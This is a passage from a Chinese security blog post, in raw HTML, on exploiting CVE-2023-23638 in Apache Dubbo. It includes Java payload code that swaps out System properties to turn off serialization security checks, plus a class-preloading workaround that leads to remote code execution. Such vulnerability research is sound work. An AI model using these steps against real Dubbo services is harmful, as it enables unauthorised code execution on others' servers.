class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ZoneRulesException</span>(<span class="string">&quot;Unable to load TZDB time-zone rules&quot;</span>, ex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 可以看到，这个构造函数中会调用System.getProperty(“java.home”)，拼接进文件读取路径，从而去读取jre路径下的tzdb.dat，这是一个IANA提供的TimeZone数据库，维护着最新最全的全球时区相关基础数据。由于我们在反序列化前替换掉了目标服务的System类的props对象，因此，这里System.getProperty(“java.home”)就会返回null，从而导致报错。</p>
<p> 这个问题如何解决呢？通过观察调用链，以及动态调试，我找到了解决方法。通过在TzdbZoneRulesProvider类的构造函数打断点。</p>
<p><img src="/img/CVE-2023-23638_1/image_oLkhamkSK9.png"></p>
<p> 注意到TzdbZoneRulesProvider的初始化是被ZoneRulesProvider的类初始化调用的。ZoneRulesProvider的相关代码如下：</p>
<p><img src="/img/CVE-2023-23638_1/image_-131oQ8pVF.png"></p>
<p> 可以看到在ZoneRulesProvider类的static代码块中调用的new TzdbZoneRulesProvider()。static块的代码在程序被运行起来后，之后最多加载一次。因此如果可以让这个ZoneRulesProvider类在我们执行攻击前被加载一次，那么我们在执行攻击时就不会再加载这块代码，也就不会报错了。</p>
<p> 有了这个方法，第一时间就想到，dubbo 的泛化调用可以初始化并newIntance类，并且TzdbZoneRulesProvider是ZoneRulesProvider的子类，ZoneRulesProvider在newIntance时初始化其弗雷，从而调用传ZoneRulesProvider类的static代码。基于这个想法，构造如下代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Map <span class="title function_">getInstance</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    map.put(<span class="string">&quot;class&quot;</span>, <span class="string">&quot;java.time.zone.TzdbZoneRulesProvider&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> map;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Map <span class="title function_">getProperties</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">Properties</span> <span class="variable">properties</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">    properties.setProperty(<span class="string">&quot;dubbo.security.serialize.generic.native-java-enable&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line">    properties.setProperty(<span class="string">&quot;serialization.security.check&quot;</span>,<span class="string">&quot;false&quot;</span>);</span><br><span class="line">    <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    map.put(<span class="string">&quot;class&quot;</span>, <span class="string">&quot;java.lang.System&quot;</span>);</span><br><span class="line">    map.put(<span class="string">&quot;properties&quot;</span>, properties);</span><br><span class="line">    <span class="keyword">return</span> map;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p> 分成两步发送，最后发送序列化poc，即可完成代码执行。</p>
<p><img src="/img/CVE-2023-23638_1/image_yV-gAvCExr.png"></p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul>
<li><a target="_blank" rel="noopener" href="https://paper.seebug.org/2055/" title="https://paper.seebug.org/2055/">https://paper.seebug.org/2055/</a></li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12333" title="https://xz.aliyun.com/t/12333">https://xz.aliyun.com/t/12333</a></li>
</ul>

        
        <br />
        <div id="comment-container">
        </div>
        <div id="disqus_thread"></div>
        <div id="lv-container"></div>
        <div class="giscus"></div>
    </div>
</div>

    </div>
</div>


<footer class="footer">
    <ul class="list-inline text-center">
        
        

        

        

        

        

    </ul>
    
    <p>
        <span id="busuanzi_container_site_pv">
            <span id="busuanzi_value_site_pv"></span>PV
        </span>
        <span id="busuanzi_container_site_uv">
            <span id="busuanzi_value_site_uv"></span>UV
        </span>
        Created By <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>  Theme <a target="_blank" rel="noopener" href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
</footer>




</body>

<script>
    // We expose some of the variables needed by the front end
    window.hexo_search_path = "search.json"
    window.hexo_root = "/"
    window.isPost = true
</script>
<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>

<script src="/js/index.js"></script>

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>




    <script src="https://giscus.app/client.js"
    data-repo="YYHYlh/YYHYlh.github.io"
    data-repo-id="R_kgDOJjKWvw"
    data-category="Announcements"
    data-category-id="DIC_kwDOJjKWv84CWs3N"
    data-mapping="pathname"
    data-strict="0"
    data-reactions-enabled="1"
    data-emit-metadata="0"
    data-input-position="bottom"
    data-theme="preferred_color_scheme"
    data-lang="zh-CN"
    crossorigin="anonymous"
    async>
</script>




</html>
